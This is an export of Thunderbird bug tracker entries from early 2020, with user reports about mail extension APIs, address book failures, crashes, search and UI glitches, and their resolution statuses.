1617393,browser.mailingLists.get() returns a MailingListNode with contacts undefined,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: In my 'Limit non-BCC Recipients' Mail Extension I need to match recipient entries which are not email addresses with mailing lists and count the number of contacts. I loop round browser.addressBooks.list, browser.mailingLists.list, and browser.mailingLists.get to match on each such recipient. I can match OK but I find that the contacts property of the MailingListNode is (always?) undefined. e.g. a matching list: This list: {""id"":""0c474d69-316a-452d-b5fa-3d1531438de4"",""parentId"":""49e58e58-257c-40bd-95a5-238931df19ca"",""type"":""mailingList"",""name"":""List_of_2_valid"",""nickName"":"""",""description"":""""} That list has 2 entries. The 2 entries are in the same address book and I clicked on the suggested contacts when I entered them. I note that contacts is optional, but I assume a list can be empty. https://thunderbird-webextensions.readthedocs.io/en/latest/mailingLists.html#mailinglists-mailinglistnode Using TB 75.0a1 (2020-02-21) (64-bit) One for Geoff Lankow I think."
1617398,"After update Jan 2020: Sending mail ok, but cannot receive mail anymore due to timeout",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362 Steps to reproduce: Thunderbird (German version) updated automatically to Version 68.5.0 (32-Bit). Actual results: Since this update it is impossible receiving mails because after a while ""Timeout"" Message appears. However: Sending e-mails is working properly. Expected results: Receiving e-mails…."
1617399,Instructions for migrating files and contacts from Windows Live Mail in a windows 10 are wrong or obsolete. I cannot find help for this in your huge morass of help and discussions.,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363 Steps to reproduce: Have used Windows Live Mail for years but MicroMonopoly ended support for it in Windows 10 as Windows 7 support ended. I installed Thunderbird, but cannot find a way to import all my old computer-hosted emails and contacts. New mail off the server comes into Thunderbird, and new composed mail goes out, but I want the threads of previous communications and contracts and contacts also brought into the Thunderbird system, and cannot find how. Help postings on doing this advise using tabs and subtabs in windows live mail that do not seem to exist. Ergo, the help is either fatally wrong or obsolete. If Thunderbird cannot do what I want, do you recommend some email client that will do the importing of old pop3 mail on my computer and contacts on my computer? Actual results: I got left in computer hell Expected results: Thunderbird should have this function. Help should have help postings to correctly guide you to the correct tabs and process steps."
1617406,comm/mail/test/browser/composition/browser_imageInsertionDialog.js | Uncaught exception - at resource://testing-common/mozmill/utils.jsm:386 - TimeoutError: Timeout waiting for modal dialog to open.,RESOLVED,P5,FIXED,**Filed by:** mkmelin [at] iki.fi **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=290035215&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/LvYxF2YcQHWpt6cD2nA5lQ/runs/0/artifacts/public/logs/live_backing.log --- Fails locally too
1617438,pop (non-Inbox) gmails are not deleted from the server per retention policy setting,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.103 Steps to reproduce: i don't remember when i start using thunderbird more then 10 year ago. at that time i set up my gmail email (IMAP) to be downloaded on my computer and set the preferences for my needs. I set on folders and bin/junk etc Retention policy to delete after 2 days old and i thought that was ok. Actual results: this year i log in into my mail and i had a look on all mails, for my surprise mails were never deleted from the server ending up with 20K email to clean up. i have made changes to i un-tick synchronisation for offline use with same settings on folders for the mail to be deleted after 2 days but i see same problem, mails are not actually deleted from the server Expected results: they should be deleted based on my settings not to find mails from 2000 in my mail (under all mails)"
1617445,"""find"" will steal focus.",RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: see bug #1554370. It was fixed around 2 months ago but reappear now with TDB 68.5.0 Actual results: see bug #1554370 Expected results: see bug #1554370
1617448,browser.compose.beginNew needs a way of specifying the identity to use,RESOLVED,--,FIXED,"In Conversations we offer a button that allows starting an email directly to a contact from within the message header. If I use `browser.compose.beginNew`, then I have no option to specify that it should use a particular account / identity / email address to use. This means that any time a user opens a compose window with this method, they'll be defaulted to the default identity, even though they're on a different account. This probably depends on some of the work in bug 1531593."
1617461,messageDisplay APIs don't take account of multiple message selection,RESOLVED,--,FIXED,"Selecting multiple messages is a possibility in Thunderbird and Thunderbird displays the summary for them, however the messageDisplay APIs only take account of a single message being displayed."
1617477,"Since the last update, when I log on, I go to a different email than my default email..",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Open Mozilla Thunderbird email client. Actual results: I have four email addresses on Thunderbird. They all open, however, my default email does not open on my inbox as previously. A different email address that is not my default opens on the inbox. Expected results: My default email should open on my inbox as it has always done."
1617486,Outgoing server panel false authentification method,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Go to: Tools>Account Setting>Outgoing server (SMTP) Just click on the list a server which have ""normal authentification method"", so the ""authentification method"" is empty in the low panel Now click on the list on a server which have ""Oauth2"", so the ""authentification method"" in panel is ""Oauth2"" Now return on the first server. Actual results: When you return on the server which had an empty authentification method, Thunderbird now indicated : ""Oauth2"" in the low panel Expected results: Thunderbird should indicate the real authentification method ..."
1617490,contacts API : storing photos must be handled by the API directly,RESOLVED,P3,FIXED,"Currently, if I want to add a photo to contact, I need to set the following contact properties: * PhotoName * PhotoType * PhotoURI with `PhotoURI` pointing to a file inside the `Photos` folder inside the users profile. With WebExtensions however direct filesystem access is not possible, so the contacts API must acceppt the image data directly and take care of the storage. We still need the `PhotoURI` property, to store an external link, so do not throw that away :-)"
1617492,beta 74 of thunderbird kills connection to Mac Address book - address autocomplete,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Updated to 74 on beta channel Tried to write email Actual results: NO saved addresses, including NO Mac Address Book addresses were accessible on address lines OR in address book view Expected results: addresses should resolve in character by character progressive display. None did in 74 including in safe mode. Reloaded 68, and they were resolved to Mac Addr Bk entries."
1617514,"Action events should give whole tab objects, not just tab IDs",RESOLVED,--,FIXED,"+++ This bug was initially created as a clone of Bug #1615934 +++ Ugh, I've done this all wrong. :-( According to [MDN](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/browserAction/onClicked), the WebExtensions browserCompose onclicked event has always had a tab object argument and recently gained an OnClickData argument. Ours has neither. Worse, our very similar messageDisplayAction has just an integer tab id (not the full object) and composeAction just gained the same. I think we should just fix them all, and compose.onBeforeSend. Only messageDisplayAction has this on 68, and AFAICT the usage is minimal to none."
1617518,After creating a search folder for unread news and feeds the folder is not displayed maildir only,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: I created a new thunderbird profile. I changed the configuration to store messages with each message in its own file. I added a gmail account. I added a news and feeds rss account. I searched news feeds for unread articles and then saved the result as a search folder. I looked at the first unread article. I exited thunderbird and relaunched it. Actual results: The unread search folder does not appear. Expected results: There should be a folder called unread which gets populated with the unread news articles (status isn't read). This has worked before but it maybe related to the setting to store emails each email in its own file, although I cannot see why. find .thunderbird/ -print|grep -i unread .thunderbird/femxw20l.default-release/Mail/Feeds/unread.msf thunderbird -v Thunderbird 68.4.1"
1617530,Crash in [@ RtlAcquireSRWLockExclusive | nsWabAddressBook::Initialize],RESOLVED,--,FIXED,This bug is for crash report bp-825dd8ad-f6db-4f29-87c2-0624d0200224. ``` Top 10 frames of crashing thread: 0 ntdll.dll RtlAcquireSRWLockExclusive 1 xul.dll nsWabAddressBook::Initialize comm/mailnews/addrbook/src/nsWabAddressBook.cpp:113 2 xul.dll nsWabAddressBook::nsWabAddressBook comm/mailnews/addrbook/src/nsWabAddressBook.cpp:97 3 xul.dll nsAbWinHelperGuard::nsAbWinHelperGuard comm/mailnews/addrbook/src/nsAbWinHelper.cpp:915 4 xul.dll nsAbOutlookInterface::GetFolderURIs comm/mailnews/addrbook/src/nsAbOutlookInterface.cpp:32 5 xul.dll XPTC__InvokebyIndex 6 @0xce1d9f9dd7 7 xul.dll nsXPTType::IsDependent const xpcom/reflect/xptinfo/xptinfo.h:258 8 xul.dll static XPCWrappedNative::CallMethod js/xpconnect/src/XPCWrappedNative.cpp:1145 9 xul.dll XPC_WN_CallMethod js/xpconnect/src/XPCWrappedNativeJSOps.cpp:947 ```
1617535,Intermittent comm/mail/test/browser/addrbook/browser_addressBook.js | Uncaught exception - at resource://testing-common/mozmill/AddressBookHelpers.jsm:260 - Error: Could not find the index for the address book named Some Mailing List,RESOLVED,P5,FIXED,**Filed by:** mkmelin+mozilla [at] iki.fi **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=290126954&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/RtM2wMSOQjGFLfETQ5IrjQ/runs/0/artifacts/public/logs/live_backing.log ---
1617557,Insane CPU use in latest version,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Start Thunderbird, allow it to update to latest version. Versions 68.4.2 through 68.5.0 are affected. Actual results: CPU use is not sustainable on consumer laptops. You need to stop developing on high powered machines, or at least test on cheap consumer hardware. Thunderbird is almost unusable now on the following: AMD A8-4500M APU or Intel Pentium N3710 Previous versions of Thunderbird worked fine. Someone added something without thinking or testing or cpu profiling. It looks like it was UI/UX work - which is the usual culprit in such cases. It is very Dilbert. Please revert the changes and refrain from untihinking modification of the UI. Don't let the C# .net kids at the code. Please. Expected results: It should run normally. Not pause for minutes at a time processing some stupid UI skin that the kids put on top of the old code. Also, a throwaway email account was created to post this bug, because you can't just post people's email addresses just because they created an account. You'll need to fix that too."
1617597,Expired certificates for mail servers breaks TB,RESOLVED,--,INCOMPLETE,"The certificate for my mail server expired. TB will not let me do anything since it will not allow me to accept the expired cert, or to cancel. No matter what I push, the expired cert window keeps coming up, and I cannot check my mail for non-expired servers."
1617737,Over 800 nsemail.eml files in temp folder,RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Open temp folder Actual results: Observer 843 files with name nsemail.eml and increments of that. Also rogue .pdf files from email. Thunderbird needs to not create this mess. Expected results: Not seen those files
1617755,Master password prompt appears after connecting to mail server,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Opened thunderbird with at least one account that has it's credentials protected with master password. Actual results: TB connects to the mail server, reads the account creds, then realises it needs to decrypt them, prompting me for master pass. It then hangs until the password is or isn't entered, and frequently fails to connect to the mail server as the connection gets dropped before the whole process is complete. Expected results: TB should see that the account has encrypted creds and prompt for master pass (until it's either entered or cancelled) *before* making any connection to the server. I used to be able to work around this issue with the StartupMaster plugin, however it is no longer compatible with TB and likely never will be because it blocked the whole program from loading."
1617796,Shutdown Crash in [@ ldap_abandon_ext] with Mac,RESOLVED,--,FIXED,"#7 crash for Macs for 68.5.0. In the past 6 months there are not crashes prior to 68.3.0, so regression? Further, the earliest non-release crash is 71.0b1? buildid 20191113091023 bp-f4eae0cb-736f-43a5-af3e-b1e720191128 https://crash-stats.mozilla.com/signature/?product=Thunderbird&signature=ldap_abandon_ext&date=%3E%3D2019-08-25T03%3A02%3A00.000Z&date=%3C2020-02-25T03%3A02%3A00.000Z#graphs This bug is for crash report bp-a72338e5-8aaa-456e-8ba9-4fa130200225. 75.0a1 ``` Top 10 frames of crashing thread: 0 libldap60.dylib ldap_abandon_ext comm/ldap/c-sdk/libraries/libldap/abandon.c:96 1 XUL XUL@0x96f0 2 XUL XUL@0x447d9e 3 XUL XUL@0x44b558 4 XUL XUL@0x54ced5 5 XUL XUL@0x54dc5c 6 XUL XUL@0x447d9e 7 XUL XUL@0x44b558 8 XUL XUL@0xa07cf3 9 XUL XUL@0x9c0655 ``` This happened on shutdown, after I had attempted to delete the Mac OSX Address Book, which resulted in the following in the Error Console. NS_ERROR_UNEXPECTED: Unexpected error'Unexpected error' when calling method: [nsIAbManager::deleteAddressBook] abCommon.js:372 21:49:42.542 An error occurred executing the button_delete command: [Exception... ""Unexpected error'Unexpected error' when calling method: [nsIAbManager::deleteAddressBook"
1617826,"Question marks in the ""to:"" input and the ""wrote:"" line when replying",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Receive an e-mail with certain encoding of international characters in the ""From:"" field (see the attached bad-name.eml, drag it into your inbox or a local folder and press ""Reply""). Press ""Reply"". Actual results: The ""to:"" input and the ""wrote:"" line contain the question mark glyphs instead of international characters: ������-������ <test@test.org> Expected results: The ""to:"" input and the ""wrote:"" line should contain exactly the same characters as seen in the inbox column ""From"" and the preview field ""From"": абвгде-ёжзикл <test@test.org> The translation of the characters in the inbox seems to depend on the mailbox. For example, when I drag the .eml file to my Gmail inbox, the ""From"" column displays the question marks too, but when I use a local folder or my Lotus mailbox the ""From"" column displays correctly. The preview field always displays the correct characters. I couldn't find the mailbox-specific encoding settings. My OS region is Russia, the Thunderbird version is Russian. The characters in the attached bad-name.eml are from Russian alphabet"
1617868,Unable to star messages,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.103 Steps to reproduce: I updated Thunderbird to the last release 68.5.0 (32bits) of february 11th 2020. I am unable to star messages in the main inbox panel. I cannot see what messages are starred. Actual results: The column with the star in the heading is visible, but the given stars are not. The column width seems to be set too small, but it is not possible for me to change the width. Expected results: I should see the yellow star next to the starred messages and I should be able to star or unstar message in the star-column."
1617904,Click second time once opened attachment,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36 Steps to reproduce: Receive message with attachment. Select it in message list. Click the attachment filename (PDF). Open with Acrobat Reader. Close Acrobat Reader. Go back to TB, click the attachment once again. Actual results: Nothing happens after second click. Expected results: There should be again opened window with selection what to do with the attachment (Open/Save)."
1617932,Mails are lost when moving them to an other folder and renaming folder afterwards,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: - I've moved 3 Mails from my Inbox to an other folder by drag and dropping. - Then like 2 seconds afterwards I've renamed the folder. Actual results: The moved Mails don't appear in the renamed folder, but also aren't in the original folder anymore. I can't find them anywhere. Also using the webmail interface I can't find them. So I guess they really are gone... Expected results: The moved mails should be in the renamed folder. --- some extra infos: The IMAP Server is a dovecot 2.3.x. The internet connection I'm using is sometimes pretty slow (lot of package loses). So maybe it didn't finish moving the mails yet, when renaming the folder?"
1617949,datepicker/timepicker background do not change color while open but text do,RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: With HighContrast theme, try to add a new task in Thunderbird's calendar. On the ""start"" row, click date or hour to open the popup. Actual results: The text (date or time) becomes invisible. Expected results: The text switches to selected item color (ok) but the background color should follow and become black."
1618007,Unable to delete email until after restart,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36 Steps to reproduce: After using Thunderbird for some time (I'm not sure of the interval between occurrences of the issue) I am no longer able to delete email. In list view, I have tried using the Delete key, the Edit menu option to Delete, and the right-click menu option to Delete. In message view, I have tried using the Delete key and the Edit menu option to Delete. None of these five methods delete the email. I am able to confirm that the message persists (and the issue remains) after quitting and restarting Thunderbird normally. I've also observed that if an email is marked as ""Unread"" the above methods will mark the email as ""Read"". This suggests that the ""Delete"" event is being triggered correctly, it just isn't being handled correctly. After I observe the issue, I am able to resolve using the following steps: First, I restart using the Help menu option to Restart with Addons Disabled. Then, during the restart, when prompted with a dialog about safe mode, instead of continuing in safe mode, I do not change any of the options, and simply click Quit. I then resta"
1618100,Address book window does not update when books are added or removed,RESOLVED,--,FIXED,There's some XPCOM weirdness going on here that causes the address book listener to sometimes work but mostly not work.
1618224,Address book completely broken in 74.0b1,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Immediately after upgrade to 74.0b1 Address Book functions ceased working. Actual results: Autocomplete in mail compose window fails to match any Thunderbird Address Book or macOS Address Book entries. All email addresses must be entered manually. Thunderbird Address Book shows no entries at all. Buttons to add new contact card or list do not trigger any action. Address book backups and SQLite database appear to be intact and contain valid information. SQLite database browser shows that address and history databases contain expected structure and contact information. New profile or starting in safe mode shows same behavior: Address Book and mail compose address autocomplete do not work, and no new contacts or contact lists can be added. Expected results: Entering contact name or email should trigger automatch/autocomplete in mail compose window. Thunderbird Address Book should show existing contacts and allow addition of new contacts or lists. System (macOS) Address Book should be queried for matches during mail compose autocomplete. All of these functions worked in v7"
1618296,Quick Filter starts full search when typing fast enough,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: This happens on two different TB installations with 68.5.0 on Windows 10: When typing something in the Quick Filter too quickly, the 'full search' is opened using those characters. This should normally only happen when pressing return twice to activate the search across all folders. so steps: - Activate Quick Filter - Start typing something with some speed Actual results: - After about 3-5 characters, the popup comes up suggesting to press enter again to search across all folders, even though only some characters were entered - When continuing, the search opens using the characters entered up to now The error console shows: Error: There is no active filterer but we want one. errUtils.js:79:10 errorWithDebug resource:///modules/errUtils.js:79 get activeFilterer chrome://messenger/content/quickFilterBar.js:587 handler chrome://messenger/content/quickFilterBar.js:234 _fireCommand chrome://global/content/elements/search-textbox.js:241 notify resource://gre/modules/Timer.jsm:62 Expected results: - Quick Search should have continued, no full search started."
1618327,"How to filter e-mail on ""source"" info of an e-mail",RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: I drop an info in the filter but this does not work Actual results: nothing
1618338,Labels for Subject and Date overlap,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Display a mail Actual results: The labels overlapped, so that the date becomes unreadable Expected results: Ellipsis on the subject"
1618389,Search not working for short words with 2 characters,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 Steps to reproduce: I am searching through my mail but short search terms seem to have no effect. For example I wanted to order some ink cartridges and so I searched my mail several times using related terms to find out who I had ordered from last time. Actual results: I searched these terms, all with no results: hp 96 ""hp 96"" 2 pk ""2 pk"" I searched these terms, which showed results: deskjet photosmart All of the queries should return the same results. Expected results: At the very least it is misleading for Thunderbird to tell me there's no results for what I typed when it (I guess) ignores those search terms. It should say the search terms are too short, if that's the case. However I think short search terms should work the same as long search terms. I figure maybe the short words and terms aren't indexed because it would use more resources. I checked help but I don't see it documented."
1618482,Message moved to archives after key import,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: - I received an email with a new PGP key - I double-clicked on the attachment which led to the Enigmail Confirmation dialog box asking me how to handle the OpenPGP key file - After clicking Import, the new key was indeed added but the message itself was gone The precise version is 68.4.1 (64-bit) with Enigmail version 2.1.2 (20191031-1357) Actual results: I found the original message via the search function and it had been moved automatically in the Archives/2020/ location. This folder did not exist before and it holds just this message. Expected results: Only the key should have been added (as it did) and the message should have remained in the Inbox. Note: my experience has some similarities to bug 1214483 which did not show up in the list of potentially related bugs. Please excuse if I overlooked another report."
1618485,[StorageManager web API] navigator.storage.persist() never fulfills Promise,RESOLVED,--,WONTFIX,"Consider a WebExtension with ""unlimitedStorage"" permission and this code in background.js: ```javascript async function main() { console.log(""Start""); console.log(await navigator.storage.persisted()); console.log(await navigator.permissions.query({name:'persistent-storage'})); console.log(await navigator.storage.persist()); console.log(""Stop""); } main(); ``` Expected output (as in FireFox 73) ``` Start false PermissionStatus { state: ""granted"", onchange: null } true Stop ``` What actually happens in Thunderbird 68 and 74 ``` Start false PermissionStatus { state: ""granted"", onchange: null } ``` The call to navigator.storage.persist() never fullfills and code execution stops. I was testing this on Windows 10."
1618561,calendar tab always opens at last position,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Using ThB 68.4.1 with calendar (google) & News feed & enigmail. Also, I have a Master password set. When I open Thb. I want to have the following Tabs always opened: - Inbox - One of the sub-folder of the Inbox - Calendar - News & Feeds So I configure ThB to have these Tabs opened in this order. See top part of the attached picture Actual results: Since recently (few weeks), if I close ThB, and re-open it, it asks for the Master password, then shows the Tabs, but in the following order: - Inbox - One of the sub-folder of the Inbox - News & Feeds - Calendar See Bottom part of the attached picture Expected results: The Tabs should have been re-opened in the same order as I configured them before closing ThB: - Inbox - One of the sub-folder of the Inbox - Calendar - News & Feeds What I guess is happening is that in parallel as ThB asks for the Master Password, it opens some Tabs it can out-of-the-box (the ones that are not protected by Password? or the ones not being managed by a plugin?), then once the Master Password is validated, it opens the remaining Tabs (the ones that we"
1618616,Button overlap in Accounts Settings pane with smaller windows,RESOLVED,--,FIXED,"When the Default Identity description wraps to a second line, because the window is too small, the ""Manage Identities..."" button overlaps the ""Edit SMTP server..."". This comes probably because of the change to use <fieldset>."
1618623,Send button does not work after upgrade onto Thunderbird 60.6.1. (64-bit) on Ubuntu Linux,RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 Steps to reproduce: - Upgrade from an older Thunderbird version onto 60.6.1 - OS: Ubuntu Linux Solution which temp solved my issue: - I disabled my companies LDAP connection to the Thunderbird client Just remove any direct LDAP connection from the email account profile/configuration 1. Go to Menu tab: Edit 2. Select: Composition 3. Disable: Any LDAP connection/entry 4. Select instead: Local Address Books 5. Save 6. Restart Thunderbird Actual results: - Send button has not worked anymore after the upgrade was finished Expected results: - I normally should be able to send emails after i completed the upgrade onto a newer version
1618660,Street Address wraps too early in Address Book,RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Viewed contact details in Address Book. Actual results: The street address wraps too early. 9999 Sherwood Dr Expected results: The street address should have been displayed on one line. 9999 Sherwood Dr
1618709,Trash folder often (~1 in 3 times) disappears when emptying trash then cannot delete messages. Restarting Thunderbird fixes until next time.,UNCONFIRMED,--,,"Trash folder often (~1 in 3 times) disappears when emptying trash from file menu, then cannot delete any further messages. Restarting Thunderbird fixes until next time. Similar faults reported in the past (11 years ago) but nothing was done."
1618774,XMPP connection fails after upgrade to 74.0b1,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Tried to connect to XMPP server. Setting for encrypted/non-encrypted setting made no difference. Debug log not very informative. No connection logs on the server. Actual results: (Thunderbird 74.0 (20200212221342), Gecko 74.0 (20200212221342) on Intel Mac OS X 10.15) [28/2/20, 4:55:28pm AEST] DEBUG (@ prpl-jabber: connect resource:///modules/socket.jsm:165) Connecting to: chat.xxxx.com.au:5222 Expected results: Connection!"
1618800,thunderbird crash when creating a new message or reply to a message,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15 Steps to reproduce: when trying to create a new message or reply to a message Actual results: thunderbird is crashing without message. No crash report available. Test also in safe mode. Expected results: open a new window for composing message. Version 68.5.0 on OSX Catalina (10.15.3)"
1618927,Won't retain window sizes on monitor on restart,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362 Steps to reproduce: Close and restart a few times. I open thunderbird on an external monitor. It does remember which monitor to open on. Actual results: Eventually windows resize themselves. Expected results: Windows should retain the size and position I give them."
1618961,Automatically migrate users off of 32 bit Thunderbird using Help:About,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Go to Help:About Actual results: No update other than 32 bit is offered Expected results: Should ask if you want to update to 64 bit Thunderbird (same version or higher version). As far as I know, this applies to all versions of Thunderbird."
1619046,enable adaptive junk mail controls doesn't stick,RESOLVED,--,DUPLICATE,"Current nightly build on Mac. Reproduced in safe mode. I did not test any other platform. 1. Open account settings 2. click Junk settings 3. ** observe that ""enable adaptive junk mail controls"" box is checked (enabled), AND ""Do not automatically mark ..."" and the address books are greyed out ... as if ""enable adaptive junk mail controls"" is NOT enabled 4. click the checkbox ""enable adaptive junk mail controls"" 5. ** observe that ""enable adaptive junk mail controls"" is still checked - it should have gone unchecked 6. click the checkbox ""enable adaptive junk mail controls"" (this is the second time) 7. ** observe that ""enable adaptive junk mail controls"" is unchecked and the address books are not greyed out 8. click a different setting tab, such as composition 9. click Junk settings Actual results: ""enable adaptive junk mail controls"" is checked (enabled) Expected results: ""enable adaptive junk mail controls"" is unchecked (disabled)"
1619057,Mail Extension compose.onBeforeSend returning a mailing list fails,RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: As mentioned in topicbox forum: https://thunderbird.topicbox.com/groups/addons/T5d6979f2417f424c-M03013aee0a804913c76604c3/compose-onbeforesend-returned-object-format Summary: Using compose.onBeforeSend, not cancelling the send, and returning a mailing list in the [details] object fails ""syntax error in parameters or arguments"" Screenshot: https://revad.github.io/shared/Change_lint_to_BCC_Screenshot_2020-02-26_13-57-58.png Object returned was New obj:{""details"":{""to"":[],""cc"":[],""bcc"":[""List_of_2_valid <List_of_2_valid>""],""replyTo"":[],""followupTo"":[],""newsgroups"":[],""subject"":""Test 2""},""cancel"":false} It doesn't make any difference whether you move the object to BCC or not. (I also tried returning an object-formatted mailing list - that failed too.) Addon I'm testing: https://github.com/revad/limit_non-BCC_recipients"
1619075,"Right-click ""copy"" image doesn't copy shit",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: 1. Compose a new HTML message 2. From another application, e.g. GIMP, copy an image 3. Paste it into the message you are composing 4. Make sure the image you copied is no longer in the clipboard by copying and pasting some other image, regardless of whether it's in Thunderbird or outside. 4. Now go back to the message you're composing in Thunderbird. Select an image in your message by clicking on it. Right-click and select ""Copy"" 5. Try to paste it in another application, e.g. GIMP Actual results: Doesn't paste the image I copied from Thunderbird. Instead, it pastes whatever previous image I had copied from somewhere else Expected results: When I right-click on an image in Thunderbird and click Copy I expect the f*****g image to be copied into the f*****g clipboard, just like in every other f*****g application."
1619089,"Random email item unreadable because of scam warning ""add an exception…"" message and a ""Try again""",UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: This would seem to be in the bug class. Thunderbird 68.5.0 (32-bit) I have two accounts, one Gmail and one from my domain provider. In both cases, I get random emails that cannot be read. Actual results: They have an ""Or you can add an exception…"" message and a ""Try again"" button which has no active function. Nothing can be done except delete. Those same messages are fine when received by my phone, and are ok in TB when I forward them to myself with either account. Expected results: Since this is random (about 1 in 10) it is hard to specifically reproduce, and there is no source that is immune or consistently fails. So, it should not be happening."
1619098,"When opening an attachment of an unknown type, can't chose the ""helper"" application to view it",UNCONFIRMED,--,,"To reproduce: 1. Right-click on an attachment on a received mail 2. Thunderbird proposes to save the file, or to open it with a ""helper"" application 3. There is a short list of default helper application plus a choice ""Other"" 4. However, even the ""Other"" / ""View All Appliations"" choice just pops up another still limited list of predefined applications. There is no way to enter my own application (in my case, emacsclient, to view .patch files). This used to work in older versions of Thunderbird even if it clumsily. Unfortunately, I don't remember exactly when this possibility disappeared."
